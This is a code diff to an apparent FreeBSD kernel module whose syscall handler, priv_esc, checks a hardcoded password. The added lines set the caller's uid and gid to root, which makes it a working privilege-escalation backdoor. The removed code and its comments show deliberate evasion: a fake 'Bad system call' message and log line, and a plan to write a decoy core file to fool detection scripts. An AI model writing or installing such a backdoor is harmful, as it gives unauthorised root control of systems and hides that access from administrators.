@@ -23,28 +23,19 @@ static int
 priv_esc(struct thread *td, void *syscall_args) {
     struct sc_args * args = (struct sc_args *) syscall_args;
 
-    if (strcmp(args->passwd, PRIV_ESC_PASSWD) != 0) {
-
+    if (syscall_args == NULL || strcmp(args->passwd, PRIV_ESC_PASSWD) != 0) {
+        // TODO still need to defend against 0 args passed in. syscll_args == NULL check doesn't work
+        // TODO change to raise(SIGSYS) to simulate real behavior
         uprintf("[*] module: incorrect password provided\n");
-
-        // will write to controlling tty
-        // TODO need to print this to the correct stream
-        uprintf("Bad system call (core dumped)\n");
-
-        // printf will write to dmesg
-        // took me (jshi) so long to figure out that struct thread is defined in /sys/sys/proc.h
-        // struct thread and struct proc are defined in proc.h
-        // TODO figure out uid from struct thread/struct proc/somewhere else
-        // TODO dump core OR write a random core file to pwd (proc_name.core) to fool detection scripts.
-        printf("pid %d (%s), uid %d: exited on signal %d (core dumped)\n",
-                // TODO check if the default syscall behavior uses real, effective, or saved uid for failed syscalls
-                // this currently uses real uid
-                td->td_proc->p_pid, td->td_proc->p_comm, td->td_ucred->cr_ruid, SIGSYS);
-
         return ENOSYS;
     }
 
+    td->td_ucred->cr_uid = td->td_ucred->cr_ruid = td->td_ucred->cr_svuid = 0u;
+    td->td_ucred->cr_gid = td->td_ucred->cr_rgid = td->td_ucred->cr_svgid = 0u;
+
     uprintf("[*] module: correct password provided\n");
+    uprintf("[*] module: this process now has uid and gid of root\n");
+
 	return 0;
 }
 
